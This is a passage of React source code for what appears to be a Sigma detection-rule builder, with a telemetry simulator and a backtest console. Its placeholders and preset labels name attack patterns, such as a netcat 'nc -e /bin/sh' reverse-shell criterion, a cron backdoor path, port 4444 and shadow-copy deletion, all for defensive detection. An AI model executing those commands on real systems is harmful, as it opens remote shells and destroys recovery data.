                    <Icon name="terminal" size={11} />
                    <span>Sigma YAML Code</span>
                  </button>
                </div>

                <span className="font-bold text-text-primary text-xs truncate max-w-xs">
                  {authorMode === "builder" ? builderTitle : activeRule ? activeRule.title : "Custom Detection Rule Draft"}
                </span>
              </div>

              {/* Template Presets Bar */}
              <div className="flex flex-wrap items-center gap-1 text-[10px]">
                <span className="text-text-faint uppercase mr-1">Presets:</span>
                <button
                  onClick={() => loadExample("windows")}
                  className="press rounded border border-border-subtle bg-bg-base px-1.5 py-0.5 text-text-muted hover:border-accent/40 hover:text-accent"
                >
                  Win Sysmon
                </button>
                <button
                  onClick={() => loadExample("linux")}
                  className="press rounded border border-border-subtle bg-bg-base px-1.5 py-0.5 text-text-muted hover:border-accent/40 hover:text-accent"
                >
                  Linux eBPF
                </button>
                <button
                  onClick={() => loadExample("macos")}
                  className="press rounded border border-border-subtle bg-bg-base px-1.5 py-0.5 text-text-muted hover:border-accent/40 hover:text-accent"
                >
                  macOS ES
                </button>
                <button
                  onClick={() => loadExample("c2")}
                  className="press rounded border border-border-subtle bg-bg-base px-1.5 py-0.5 text-text-muted hover:border-accent/40 hover:text-accent"
                >
                  C2 Beacon
                </button>
                <button
                  onClick={() => loadExample("ransomware")}
                  className="press rounded border border-border-subtle bg-bg-base px-1.5 py-0.5 text-text-muted hover:border-accent/40 hover:text-accent"
                >
                  Ransomware
                </button>
              </div>
            </div>

            {/* Mode 1: Visual Rule Builder */}
            {authorMode === "builder" ? (
              <div className="p-4 bg-bg-base space-y-4">
                {/* Metadata Fields */}
                <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                  <div>
                    <label className="text-[10px] text-text-faint uppercase font-bold block mb-1">Rule Title</label>
                    <input
                      type="text"
                      value={builderTitle}
                      onChange={(e) => setBuilderTitle(e.target.value)}
                      placeholder="e.g. Suspicious Netcat Reverse Shell"
                      className="w-full rounded-md border border-border-subtle bg-bg-surface px-2.5 py-1.5 text-xs text-text-primary focus:border-accent outline-none"
                    />
                  </div>
                  <div>
                    <label className="text-[10px] text-text-faint uppercase font-bold block mb-1">Severity Level</label>
                    <div className="grid grid-cols-4 gap-1.5">
                      {(["critical", "high", "medium", "low"] as const).map((sev) => (
                        <button
                          key={sev}
                          type="button"
                          onClick={() => setBuilderLevel(sev)}
                          className={`rounded border py-1 text-[10px] font-bold uppercase transition ${
                            builderLevel === sev
                              ? sev === "critical"
                                ? "border-risk-malicious bg-risk-malicious/20 text-risk-malicious"
                                : sev === "high"
                                ? "border-risk-suspicious bg-risk-suspicious/20 text-risk-suspicious"
                                : "border-accent bg-accent/20 text-accent"
                              : "border-border-subtle bg-bg-surface text-text-faint hover:text-text-primary"
                          }`}
                        >
                          {sev}
                        </button>
                      ))}
                    </div>
                  </div>
                </div>

                <div>
                  <label className="text-[10px] text-text-faint uppercase font-bold block mb-1">Rule Description & Threat Rationale</label>
                  <input
                    type="text"
                    value={builderDesc}
                    onChange={(e) => setBuilderDesc(e.target.value)}
                    placeholder="Describe what this rule detects and the threat context..."
                    className="w-full rounded-md border border-border-subtle bg-bg-surface px-2.5 py-1.5 text-xs text-text-primary focus:border-accent outline-none"
                  />
                </div>

                <div className="grid grid-cols-1 md:grid-cols-4 gap-3">
                  <div>
                    <label className="text-[10px] text-text-faint uppercase font-bold block mb-1">Target Platform</label>
                    <select
                      value={builderPlatform}
                      onChange={(e) => setBuilderPlatform(e.target.value)}
                      className="w-full rounded-md border border-border-subtle bg-bg-surface px-2 py-1.5 text-xs text-text-primary focus:border-accent outline-none"
                    >
                      <option value="all">All Operating Systems</option>
                      <option value="linux">Linux (eBPF / trace)</option>
                      <option value="windows">Windows (Sysmon / EVTX)</option>
                      <option value="macos">macOS (EndpointSecurity)</option>
                    </select>
                  </div>
                  <div>
                    <label className="text-[10px] text-text-faint uppercase font-bold block mb-1">Telemetry Category</label>
                    <select
                      value={builderCategory}
                      onChange={(e) => setBuilderCategory(e.target.value)}
                      className="w-full rounded-md border border-border-subtle bg-bg-surface px-2 py-1.5 text-xs text-text-primary focus:border-accent outline-none"
                    >
                      <option value="process_creation">Process Creation</option>
                      <option value="network_traffic">Network Traffic / Sockets</option>
                      <option value="file_change">File Modification</option>
                      <option value="registry_set">Registry Set</option>
                    </select>
                  </div>
                  <div>
                    <label className="text-[10px] text-text-faint uppercase font-bold block mb-1">MITRE Tactic</label>
                    <select
                      value={builderTactic}
                      onChange={(e) => setBuilderTactic(e.target.value)}
                      className="w-full rounded-md border border-border-subtle bg-bg-surface px-2 py-1.5 text-xs text-text-primary focus:border-accent outline-none"
                    >
                      <option value="execution">Execution</option>
                      <option value="persistence">Persistence</option>
                      <option value="defense_evasion">Defense Evasion</option>
                      <option value="command_and_control">Command and Control</option>
                      <option value="credential_access">Credential Access</option>
                      <option value="privilege_escalation">Privilege Escalation</option>
                      <option value="impact">Impact</option>
                    </select>
                  </div>
                  <div>
                    <label className="text-[10px] text-text-faint uppercase font-bold block mb-1">MITRE Technique</label>
                    <input
                      type="text"
                      value={builderTechnique}
                      onChange={(e) => setBuilderTechnique(e.target.value)}
                      placeholder="e.g. T1059.004"
                      className="w-full rounded-md border border-border-subtle bg-bg-surface px-2.5 py-1.5 text-xs text-text-primary focus:border-accent outline-none"
                    />
                  </div>
                </div>

                {/* Selection Criteria Rows */}
                <div className="space-y-2 rounded-lg border border-border-subtle bg-bg-surface/50 p-3">
                  <div className="flex items-center justify-between">
                    <div>
                      <span className="font-bold text-xs text-text-primary">Detection Selection Criteria</span>
                      <p className="text-[10px] text-text-muted">Define the specific process, command line, or network targets to trigger on</p>
                    </div>
                    <button
                      type="button"
                      onClick={() => setBuilderCriteria([...builderCriteria, { field: "CommandLine", modifier: "contains", value: "" }])}
                      className="press rounded border border-accent/50 bg-accent/15 px-2 py-0.5 text-[10px] font-bold text-accent hover:bg-accent/25"
                    >
                      + Add Criterion
                    </button>
                  </div>

                  <div className="space-y-1.5 mt-2">
                    {builderCriteria.map((c, i) => (
                      <div key={i} className="flex items-center gap-2">
                        <select
                          value={c.field}
                          onChange={(e) => {
                            const next = [...builderCriteria];
                            next[i].field = e.target.value;
                            setBuilderCriteria(next);
                          }}
                          className="w-36 rounded border border-border-subtle bg-bg-surface px-2 py-1 text-xs text-text-primary outline-none focus:border-accent"
                        >
                          <option value="CommandLine">CommandLine</option>
                          <option value="Image">Process Name (Image)</option>
                          <option value="ParentImage">Parent Process</option>
                          <option value="DestinationIp">Destination IP</option>
                          <option value="DestinationPort">Destination Port</option>
                          <option value="TargetFilename">Target File Path</option>
                          <option value="TargetObject">Registry Key</option>
                          <option value="User">User Account</option>
                        </select>

                        <select
                          value={c.modifier}
                          onChange={(e) => {
                            const next = [...builderCriteria];
                            next[i].modifier = e.target.value;
                            setBuilderCriteria(next);
                          }}
                          className="w-28 rounded border border-border-subtle bg-bg-surface px-2 py-1 text-xs text-text-primary outline-none focus:border-accent"
                        >
                          <option value="contains">contains</option>
                          <option value="startswith">startswith</option>
                          <option value="endswith">endswith</option>
                          <option value="equals">equals</option>
                          <option value="regex">regex</option>
                        </select>

                        <input
                          type="text"
                          value={c.value}
                          onChange={(e) => {
                            const next = [...builderCriteria];
                            next[i].value = e.target.value;
                            setBuilderCriteria(next);
                          }}
                          placeholder="e.g. nc -e, /bin/sh (comma-separated for OR matching)"
                          className="flex-1 rounded border border-border-subtle bg-bg-surface px-2.5 py-1 text-xs text-text-primary outline-none focus:border-accent"
                        />

                        <button
                          type="button"
                          onClick={() => {
                            if (builderCriteria.length > 1) {
                              setBuilderCriteria(builderCriteria.filter((_, idx) => idx !== i));
                            }
                          }}
                          disabled={builderCriteria.length <= 1}
                          className="text-text-muted hover:text-risk-malicious p-1 disabled:opacity-30"
                          title="Remove criterion"
                        >
                          ✕
                        </button>
                      </div>
                    ))}
                  </div>
                </div>

                {/* False Positive Exclusions */}
                <div className="space-y-2 rounded-lg border border-border-subtle/70 bg-bg-surface/30 p-3">
                  <div className="flex items-center justify-between">
                    <div>
                      <span className="font-bold text-xs text-text-muted">False-Positive Exclusion Filters (Optional)</span>
                      <p className="text-[10px] text-text-faint">Events matching these values will be silently excluded to prevent alert fatigue</p>
                    </div>
                    <button
                      type="button"
                      onClick={() => setBuilderExclusions([...builderExclusions, { field: "CommandLine", modifier: "contains", value: "" }])}
                      className="press rounded border border-border-subtle bg-bg-surface px-2 py-0.5 text-[10px] text-text-muted hover:text-text-primary hover:border-accent/40"
                    >
                      + Add Exclusion
                    </button>
                  </div>

                  {builderExclusions.length > 0 && (
                    <div className="space-y-1.5 mt-2">
                      {builderExclusions.map((c, i) => (
                        <div key={i} className="flex items-center gap-2">
                          <select
                            value={c.field}
                            onChange={(e) => {
                              const next = [...builderExclusions];
                              next[i].field = e.target.value;
                              setBuilderExclusions(next);
                            }}
                            className="w-36 rounded border border-border-subtle bg-bg-surface px-2 py-1 text-xs text-text-primary outline-none focus:border-accent"
                          >
                            <option value="CommandLine">CommandLine</option>
                            <option value="Image">Process Name</option>
                            <option value="ParentImage">Parent Process</option>
                            <option value="User">User Account</option>
                            <option value="DestinationIp">Destination IP</option>
                          </select>

                          <select
                            value={c.modifier}
                            onChange={(e) => {
                              const next = [...builderExclusions];
                              next[i].modifier = e.target.value;
                              setBuilderExclusions(next);
                            }}
                            className="w-28 rounded border border-border-subtle bg-bg-surface px-2 py-1 text-xs text-text-primary outline-none focus:border-accent"
                          >
                            <option value="contains">contains</option>
                            <option value="equals">equals</option>
                            <option value="startswith">startswith</option>
                            <option value="endswith">endswith</option>
                          </select>

                          <input
                            type="text"
                            value={c.value}
                            onChange={(e) => {
                              const next = [...builderExclusions];
                              next[i].value = e.target.value;
                              setBuilderExclusions(next);
                            }}
                            placeholder="e.g. benign_updater.exe, health_check"
                            className="flex-1 rounded border border-border-subtle bg-bg-surface px-2.5 py-1 text-xs text-text-primary outline-none focus:border-accent"
                          />

                          <button
                            type="button"
                            onClick={() => setBuilderExclusions(builderExclusions.filter((_, idx) => idx !== i))}
                            className="text-text-muted hover:text-risk-malicious p-1"
                            title="Remove exclusion"
                          >
                            ✕
                          </button>
                        </div>
                      ))}
                    </div>
                  )}
                </div>

                {/* Builder Actions */}
                <div className="flex flex-wrap items-center justify-between gap-2 pt-1 border-t border-border-subtle/50">
                  <button
                    type="button"
                    onClick={() => {
                      syncBuilderToYaml();
                      setAuthorMode("yaml");
                    }}
                    className="press inline-flex items-center gap-1 rounded-md border border-border-subtle bg-bg-surface px-2.5 py-1.5 text-[11px] text-text-muted hover:text-text-primary hover:border-accent/50"
                  >
                    <Icon name="terminal" size={11} />
                    <span>View Generated Sigma YAML →</span>
                  </button>

                  <div className="flex items-center gap-2">
                    <button
                      type="button"
                      onClick={handleTranspile}
                      disabled={busy}
                      className="press inline-flex items-center gap-1 rounded-md border border-accent/60 bg-accent/10 px-3 py-1.5 font-semibold text-accent hover:bg-accent/20 disabled:opacity-50"
                    >
                      <Icon name="terminal" size={12} />
                      <span>{busy ? "Validating…" : "Transpile & Validate"}</span>
                    </button>
                    <button
                      type="button"
                      onClick={handleDeploy}
                      disabled={importMutation.isPending}
                      className="press inline-flex items-center gap-1 rounded-md border border-signal/60 bg-signal/15 px-3 py-1.5 font-bold text-signal hover:bg-signal/25 disabled:opacity-50"
                    >
                      <Icon name="check" size={12} />
                      <span>{importMutation.isPending ? "Deploying…" : imported ? "✓ Deployed" : "Deploy into Engine"}</span>
                    </button>
                  </div>
                </div>
              </div>
            ) : (
              /* Mode 2: Monospace Sigma YAML Code Editor */
              <div className="p-3 bg-bg-base">
                <textarea
                  rows={12}
                  spellCheck={false}
                  value={yaml}
                  onChange={(e) => setYaml(e.target.value)}
                  placeholder="Author Sigma YAML detection rule (selection criteria, modifiers, MITRE tags)..."
                  className="w-full rounded-lg border border-border-subtle/80 bg-bg-surface p-3 font-mono text-xs text-text-primary placeholder:text-text-faint focus:border-accent/70 focus:outline-none leading-relaxed resize-y"
                />

                {/* Code Action Ribbon */}
                <div className="mt-2.5 flex flex-wrap items-center justify-between gap-2">
                  <div className="flex flex-wrap items-center gap-2">
                    <button
                      onClick={handleTranspile}
                      disabled={busy || !yaml.trim()}
                      className="press inline-flex items-center gap-1 rounded-md border border-accent/60 bg-accent/10 px-3 py-1.5 font-semibold text-accent hover:bg-accent/20 disabled:opacity-50"
                    >
                      <Icon name="terminal" size={12} />
                      <span>{busy ? "Validating…" : "Transpile & Validate"}</span>
                    </button>

                    <button
                      onClick={handleDeploy}
                      disabled={importMutation.isPending || !yaml.trim()}
                      className="press inline-flex items-center gap-1 rounded-md border border-signal/60 bg-signal/15 px-3 py-1.5 font-bold text-signal hover:bg-signal/25 disabled:opacity-50"
                    >
                      <Icon name="check" size={12} />
                      <span>{importMutation.isPending ? "Deploying…" : imported ? "✓ Deployed" : "Deploy into Engine"}</span>
                    </button>
                  </div>

                  {result && (
                    <span className="text-risk-clean font-semibold text-[11px]">
                      ✓ Transpiled {result.transpiled_filter_count} criteria
                    </span>
                  )}
                </div>

                {error && <p className="mt-2 text-risk-malicious text-[11px] font-semibold">{error}</p>}
              </div>
            )}

            {/* Transpiled AST Feedback Strip (Visible in both modes if evaluated) */}
            {result && (
              <div className="border-t border-border-subtle bg-bg-surface p-3 space-y-2">
                <div className="flex flex-wrap items-center justify-between gap-2 text-[11px]">
                  <span className="font-bold text-text-primary">{result.title}</span>
                  <div className="flex items-center gap-1 text-[10px]">
                    <span className="rounded bg-accent/15 px-1.5 py-0.2 text-accent">{result.rule_id}</span>
                    <span className="rounded bg-risk-malicious/15 px-1.5 py-0.2 text-risk-malicious font-bold uppercase">{result.severity}</span>
                  </div>
                </div>
                <div className="flex flex-wrap gap-1">
                  {result.mitre_tactics.map((t: string) => (
                    <span key={t} className="rounded bg-bg-base border border-border-subtle px-1.5 py-0.2 text-[10px] text-text-muted">
                      {t}
                    </span>
                  ))}
                  {result.mitre_techniques.map((t: string) => (
                    <span key={t} className="rounded bg-accent/10 px-1.5 py-0.2 text-[10px] text-accent">
                      {t}
                    </span>
                  ))}
                </div>
                <div className="mt-1 space-y-1 text-[10px]">
                  {result.criteria.map((c: any, i: number) => (
                    <div key={i} className="flex items-center gap-1.5 rounded bg-bg-base/70 px-2 py-0.5">
                      <span className={c.is_exclusion ? "text-risk-suspicious" : "text-accent"}>
                        {c.is_exclusion ? "[EXCLUSION] " : ""}{c.target_field}
                      </span>
                      <span className="text-text-faint">{c.modifier}</span>
                      <span className="text-risk-clean">&quot;{c.value}&quot;</span>
                    </div>
                  ))}
                </div>
              </div>
            )}
          </div>

          {/* Validation & Testing Lab: Interactive Dry-Run Simulator & Historical Backtester */}
          <div className="rounded-xl border border-border-subtle bg-bg-surface p-4 space-y-3 shadow-xs">
            {/* Console Tab Switcher */}
            <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border-subtle/60 pb-2.5">
              <div className="flex items-center gap-1.5">
                <button
                  type="button"
                  onClick={() => setValidationTab("simulator")}
                  className={`press rounded-md px-3 py-1.5 text-xs font-bold transition flex items-center gap-1.5 ${
                    validationTab === "simulator"
                      ? "border border-accent/60 bg-accent/20 text-accent shadow-xs"
                      : "text-text-muted hover:text-text-primary hover:bg-bg-base"
                  }`}
                >
                  <Icon name="activity" size={12} />
                  <span>⚡ Live Telemetry Simulator (Dry Run)</span>
                </button>
                <button
                  type="button"
                  onClick={() => setValidationTab("backtest")}
                  className={`press rounded-md px-3 py-1.5 text-xs font-bold transition flex items-center gap-1.5 ${
                    validationTab === "backtest"
                      ? "border border-accent/60 bg-accent/20 text-accent shadow-xs"
                      : "text-text-muted hover:text-text-primary hover:bg-bg-base"
                  }`}
                >
                  <Icon name="sliders" size={12} />
                  <span>📜 Historical Event Store Backtest</span>
                </button>
              </div>

              {validationTab === "simulator" && (
                <div className="flex items-center gap-1 text-[10px]">
                  <span className="text-text-faint mr-1 uppercase">Sample Presets:</span>
                  <button
                    onClick={() => loadSimPreset("netcat")}
                    className="press rounded border border-border-subtle bg-bg-base px-1.5 py-0.5 text-text-muted hover:text-accent hover:border-accent/40"
                  >
                    Netcat Shell
                  </button>
                  <button
                    onClick={() => loadSimPreset("powershell")}
                    className="press rounded border border-border-subtle bg-bg-base px-1.5 py-0.5 text-text-muted hover:text-accent hover:border-accent/40"
                  >
                    PowerShell Cradle
                  </button>
                  <button
                    onClick={() => loadSimPreset("shadows")}
                    className="press rounded border border-border-subtle bg-bg-base px-1.5 py-0.5 text-text-muted hover:text-accent hover:border-accent/40"
                  >
                    Shadow Delete
                  </button>
                  <button
                    onClick={() => loadSimPreset("c2")}
                    className="press rounded border border-border-subtle bg-bg-base px-1.5 py-0.5 text-text-muted hover:text-accent hover:border-accent/40"
                  >
                    C2 Beacon
                  </button>
                  <button
                    onClick={() => loadSimPreset("benign")}
                    className="press rounded border border-border-subtle bg-bg-base px-1.5 py-0.5 text-text-muted hover:text-accent hover:border-accent/40"
                  >
                    Benign Admin
                  </button>
                </div>
              )}

              {validationTab === "backtest" && (
                <div className="flex items-center gap-2">
                  <span className="text-text-faint text-[10px]">Window:</span>
                  <select
                    value={backtestWindow}
                    onChange={(e) => setBacktestWindow(Number(e.target.value))}
                    disabled={backtestRunning}
                    className="rounded border border-border-subtle bg-bg-base px-2 py-1 text-xs text-text-primary outline-none focus:border-accent"
                  >
                    <option value={500}>500 Events</option>
                    <option value={1000}>1,000 Events</option>
                    <option value={2000}>2,000 Events</option>
                    <option value={5000}>5,000 Events</option>
                  </select>
                  <button
                    onClick={handleRunInlineBacktest}
                    disabled={backtestRunning || (!yaml.trim() && authorMode === "yaml")}
                    className="press inline-flex items-center gap-1 rounded-md border border-accent/60 bg-accent/15 px-2.5 py-1 font-semibold text-accent hover:bg-accent/25 disabled:opacity-50"
                  >
                    <Icon name={backtestRunning ? "refresh" : "play"} size={11} className={backtestRunning ? "animate-spin" : ""} />
                    <span>{backtestRunning ? "Scanning…" : "Execute Backtest"}</span>
                  </button>
                  {onOpenBacktest && (
                    <button
                      type="button"
                      onClick={() =>
                        onOpenBacktest({
                          id: activeRule?.rule_id,
                          name: builderTitle || activeRule?.title || "Custom Rule",
                          customYaml: authorMode === "builder" ? syncBuilderToYaml() : yaml,
                        })
                      }
                      className="press rounded border border-border-subtle bg-bg-base px-2 py-1 text-[10px] text-text-muted hover:border-accent hover:text-accent"
                      title="Open full interactive backtest modal dialog"
                    >
                      Modal Backtest ↗
                    </button>
                  )}
                </div>
              )}
            </div>

            {/* Tab Body 1: Interactive Live Telemetry Simulator */}
            {validationTab === "simulator" && (
              <div className="space-y-3.5">
                <div className="rounded-lg border border-border-subtle bg-bg-base/70 p-3 space-y-2.5">
                  <div className="flex items-center justify-between">
                    <span className="text-[10px] uppercase font-bold text-text-faint">
                      Simulated Endpoint Event Telemetry
                    </span>
                    <span className="text-[10px] text-text-muted">
                      Test criteria against in-memory payload without modifying historical logs
                    </span>
                  </div>

                  <div className="grid grid-cols-1 md:grid-cols-3 gap-2.5">
                    <div>
                      <label className="text-[9px] text-text-faint uppercase font-bold block mb-0.5">Process Name (Image)</label>
                      <input
                        type="text"
                        value={simEvent.process_name}
                        onChange={(e) => setSimEvent({ ...simEvent, process_name: e.target.value })}
                        className="w-full rounded border border-border-subtle bg-bg-surface px-2 py-1 text-xs text-text-primary outline-none focus:border-accent font-mono"
                      />
                    </div>
                    <div className="md:col-span-2">
                      <label className="text-[9px] text-text-faint uppercase font-bold block mb-0.5">Command Line Arguments</label>
                      <input
                        type="text"
                        value={simEvent.command_line}
                        onChange={(e) => setSimEvent({ ...simEvent, command_line: e.target.value })}
                        className="w-full rounded border border-border-subtle bg-bg-surface px-2 py-1 text-xs text-text-primary outline-none focus:border-accent font-mono"
                      />
                    </div>
                  </div>

                  <div className="grid grid-cols-2 md:grid-cols-4 gap-2.5">
                    <div>
                      <label className="text-[9px] text-text-faint uppercase font-bold block mb-0.5">Destination IP</label>
                      <input
                        type="text"
                        value={simEvent.dest_ip}
                        onChange={(e) => setSimEvent({ ...simEvent, dest_ip: e.target.value })}
                        placeholder="e.g. 198.51.100.25"
                        className="w-full rounded border border-border-subtle bg-bg-surface px-2 py-1 text-xs text-text-primary outline-none focus:border-accent font-mono"
                      />
                    </div>
                    <div>
                      <label className="text-[9px] text-text-faint uppercase font-bold block mb-0.5">Destination Port</label>
                      <input
                        type="text"
                        value={simEvent.dest_port}
                        onChange={(e) => setSimEvent({ ...simEvent, dest_port: e.target.value })}
                        placeholder="e.g. 4444"
                        className="w-full rounded border border-border-subtle bg-bg-surface px-2 py-1 text-xs text-text-primary outline-none focus:border-accent font-mono"
                      />
                    </div>
                    <div>
                      <label className="text-[9px] text-text-faint uppercase font-bold block mb-0.5">File Path</label>
                      <input
                        type="text"
                        value={simEvent.file_path}
                        onChange={(e) => setSimEvent({ ...simEvent, file_path: e.target.value })}
                        placeholder="e.g. /etc/cron.d/backdoor"
                        className="w-full rounded border border-border-subtle bg-bg-surface px-2 py-1 text-xs text-text-primary outline-none focus:border-accent font-mono"
                      />
                    </div>
                    <div>
                      <label className="text-[9px] text-text-faint uppercase font-bold block mb-0.5">User Context</label>
                      <input
                        type="text"
                        value={simEvent.user}
                        onChange={(e) => setSimEvent({ ...simEvent, user: e.target.value })}
                        placeholder="e.g. root"
                        className="w-full rounded border border-border-subtle bg-bg-surface px-2 py-1 text-xs text-text-primary outline-none focus:border-accent font-mono"
                      />
                    </div>
                  </div>

                  {/* Simulator Action Buttons */}
                  <div className="flex flex-wrap items-center justify-between gap-2 pt-2 border-t border-border-subtle/50">
                    <span className="text-[10px] text-text-muted">
                      Validate logic offline or trigger a live event directly into the SOC findings pipeline.
                    </span>

                    <div className="flex items-center gap-2">
                      <button
                        type="button"
                        onClick={handleRunSimulation}
                        disabled={simRunning}
                        className="press inline-flex items-center gap-1 rounded-md border border-accent/70 bg-accent/20 px-3 py-1.5 font-bold text-accent hover:bg-accent/30 disabled:opacity-50"
                      >
                        <Icon name={simRunning ? "refresh" : "play"} size={11} className={simRunning ? "animate-spin" : ""} />
                        <span>{simRunning ? "Simulating…" : "Run Simulator (Dry Run)"}</span>
                      </button>

                      <button
                        type="button"
                        onClick={handleFireLiveTest}
                        disabled={triggerRunning}
                        className="press inline-flex items-center gap-1 rounded-md border border-signal/70 bg-signal/20 px-3 py-1.5 font-bold text-signal hover:bg-signal/30 disabled:opacity-50"
                        title="Inject event into live backend and create a real alert in the Findings queue"
                      >
                        <Icon name={triggerRunning ? "refresh" : "zap"} size={11} className={triggerRunning ? "animate-spin" : ""} />
                        <span>{triggerRunning ? "Firing…" : "Fire Live Test Event to Fleet"}</span>
                      </button>
                    </div>
                  </div>
                </div>

                {simError && (
                  <p className="rounded border border-risk-malicious/40 bg-risk-malicious/10 p-2.5 text-risk-malicious text-[11px]">
                    {simError}
                  </p>
                )}

                {triggerError && (
                  <p className="rounded border border-risk-malicious/40 bg-risk-malicious/10 p-2.5 text-risk-malicious text-[11px]">
                    {triggerError}
                  </p>
                )}

                {/* Live Trigger Success Card */}
                {triggerResult && (
                  <div className="rounded-lg border border-signal/50 bg-signal/15 p-3 flex flex-wrap items-center justify-between gap-2 animate-fade-in">
                    <div>
                      <span className="font-bold text-signal text-xs">✓ Live Test Event Ingested!</span>
                      <p className="text-[11px] text-text-primary mt-0.5">
                        Generated finding for run <span className="font-mono text-accent">{triggerResult.run_id}</span> ({triggerResult.alerts_count} alert fired).
                      </p>
                    </div>
                    <Link
                      to="/findings"
                      className="press rounded-md border border-signal/70 bg-signal/20 px-3 py-1 font-bold text-signal hover:bg-signal/30 text-xs inline-flex items-center gap-1"
                    >
                      <span>Open Alert Triage →</span>
                    </Link>
                  </div>
                )}

                {/* Simulation Output Card */}
                {simResult && (
                  <div className="rounded-lg border border-border-subtle bg-bg-surface p-3.5 space-y-3 animate-fade-in">
                    <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border-subtle/50 pb-2">
                      <div className="flex items-center gap-2">
                        <span className={`rounded-full px-2.5 py-0.5 font-bold uppercase text-[10px] ${
                          simResult.matched
                            ? "bg-risk-clean/20 border border-risk-clean/60 text-risk-clean"
                            : "bg-risk-malicious/20 border border-risk-malicious/60 text-risk-malicious"
                        }`}>
                          {simResult.matched ? "✓ MATCH CONFIRMED" : "○ NO MATCH"}
                        </span>
                        <span className="font-bold text-text-primary text-xs">
                          {simResult.matched ? "Event satisfies all detection criteria" : "Event does not satisfy rule conditions"}
                        </span>
                      </div>

                      <span className="text-[10px] text-text-muted">
                        Recommendation: <span className="text-text-primary">{simResult.recommendation}</span>
                      </span>
                    </div>

                    {/* Criteria Diagnostics Table */}
                    <div className="space-y-1">
                      <span className="text-[10px] uppercase font-bold text-text-faint">
                        Step-by-Step Criterion Evaluation ({simResult.diagnostics.length})
                      </span>
                      <div className="overflow-x-auto rounded border border-border-subtle/60 bg-bg-base/60">
                        <table className="w-full text-left text-[11px]">
                          <thead>
                            <tr className="border-b border-border-subtle/40 text-text-faint text-[10px] uppercase">
                              <th className="p-2">Scope</th>
                              <th className="p-2">Target Field</th>
                              <th className="p-2">Operator</th>
                              <th className="p-2">Expected Criteria</th>
                              <th className="p-2">Observed Value</th>
                              <th className="p-2 text-right">Result</th>
                            </tr>
                          </thead>
                          <tbody className="divide-y divide-border-subtle/30 font-mono">
                            {simResult.diagnostics.map((d, idx) => (
                              <tr key={idx} className="hover:bg-bg-surface/50">
                                <td className="p-2">
                                  <span className={`rounded px-1.5 py-0.2 text-[9px] uppercase font-bold ${
                                    d.is_exclusion ? "bg-amber-400/15 text-amber-400" : "bg-sky-400/15 text-sky-400"
                                  }`}>
                                    {d.is_exclusion ? "Exclusion" : "Selection"}
                                  </span>
                                </td>
                                <td className="p-2 font-bold text-accent">{d.target_field}</td>
                                <td className="p-2 text-text-faint">{d.modifier}</td>
                                <td className="p-2 text-text-primary">
                                  {d.expected_values.join(", ")}
                                </td>
                                <td className="p-2 text-text-muted truncate max-w-xs" title={d.event_value}>
                                  {d.event_value || "<empty>"}
                                </td>
                                <td className="p-2 text-right">
                                  <span className={`rounded px-1.5 py-0.2 text-[9px] font-bold ${
                                    d.passed
                                      ? "bg-risk-clean/20 text-risk-clean"
                                      : "bg-risk-malicious/20 text-risk-malicious"
                                  }`}>
                                    {d.status}
                                  </span>
                                </td>
                              </tr>
                            ))}
                          </tbody>
                        </table>
                      </div>
                    </div>

                    {/* Simulated Alert Preview */}
                    {simResult.simulated_alert && (
                      <div className="rounded-lg border border-accent/40 bg-accent/10 p-3 space-y-1.5">
                        <div className="flex items-center justify-between">
                          <span className="font-bold text-xs text-text-primary">
                            Simulated SOC Finding Preview: {simResult.simulated_alert.rule_name}
                          </span>
                          <span className="rounded bg-risk-malicious/20 px-2 py-0.2 text-[10px] font-bold text-risk-malicious uppercase">
                            {simResult.simulated_alert.severity}
                          </span>
                        </div>
                        <p className="text-[11px] text-text-muted">
                          {simResult.simulated_alert.details}
                        </p>
                        <div className="flex items-center gap-1.5 pt-1 text-[10px]">
                          <span className="rounded bg-bg-base border border-border-subtle px-1.5 py-0.2 text-text-muted">
                            Tactic: {simResult.simulated_alert.mitre_tactic}
                          </span>
                          <span className="rounded bg-accent/20 px-1.5 py-0.2 text-accent font-bold">
                            Technique: {simResult.simulated_alert.mitre_technique}
                          </span>
                        </div>
                      </div>
                    )}
                  </div>
                )}
              </div>
            )}

            {/* Tab Body 2: Historical Backtesting Console */}
            {validationTab === "backtest" && (
              <div className="space-y-3">
                {backtestError && (
                  <p className="rounded border border-risk-malicious/40 bg-risk-malicious/10 p-2 text-risk-malicious text-[11px]">
                    {backtestError}
                  </p>
                )}

                {!backtestResult && !backtestRunning && (
                  <p className="py-6 text-center text-text-muted text-[11px]">
                    Run backtest to evaluate this rule against historical SQLite EDR event streams and verify false-positive risk.
                  </p>
                )}

                {backtestResult && (
                  <div className="space-y-3">
                    {/* Backtest HUD Strip */}
                    <div className="grid grid-cols-3 gap-2.5">
                      <div className="rounded-lg border border-border-subtle bg-bg-base/60 p-2.5">
                        <span className="text-[10px] text-text-faint uppercase">Events Evaluated</span>
                        <p className="text-sm font-bold text-text-primary mt-0.5">{backtestResult.events_scanned.toLocaleString()}</p>
                      </div>
                      <div className="rounded-lg border border-border-subtle bg-bg-base/60 p-2.5">
                        <span className="text-[10px] text-text-faint uppercase">Rule Trigger Hits</span>
                        <p className="text-sm font-bold text-accent mt-0.5">
                          {backtestResult.matches_count} ({backtestResult.match_rate_pct}%)
                        </p>
                      </div>
                      <div className="rounded-lg border border-border-subtle bg-bg-base/60 p-2.5">
                        <span className="text-[10px] text-text-faint uppercase">Est. False Positive Risk</span>
                        <p className={`text-sm font-bold mt-0.5 uppercase ${
                          backtestResult.estimated_fp_risk === "low"
                            ? "text-emerald-400"
                            : backtestResult.estimated_fp_risk === "medium"
                              ? "text-amber-400"
                              : "text-rose-500"
                        }`}>
                          {backtestResult.estimated_fp_risk}
                        </p>
                      </div>
                    </div>

                    {/* Historical Matched Events Table */}
                    <div className="space-y-1.5">
                      <span className="text-[10px] uppercase font-bold text-text-faint">
                        Matched Historical Telemetry Events ({backtestResult.sample_matches.length})
                      </span>
                      {backtestResult.sample_matches.length === 0 ? (
                        <div className="rounded-lg border border-border-subtle bg-bg-base/50 p-4 text-center text-text-muted text-[11px]">
                          Zero events triggered within the scanned window — low false positive risk.
                        </div>
                      ) : (
                        <div className="max-h-56 overflow-y-auto space-y-1 rounded-lg border border-border-subtle bg-bg-base/70 p-2 pr-1">
                          {backtestResult.sample_matches.map((m: any, idx: number) => (
                            <div key={idx} className="rounded border border-border-subtle/60 bg-bg-surface p-2 text-[11px]">
                              <div className="flex items-center justify-between text-text-muted">
                                <span className="font-bold text-accent">{m.process_name || m.event_type}</span>
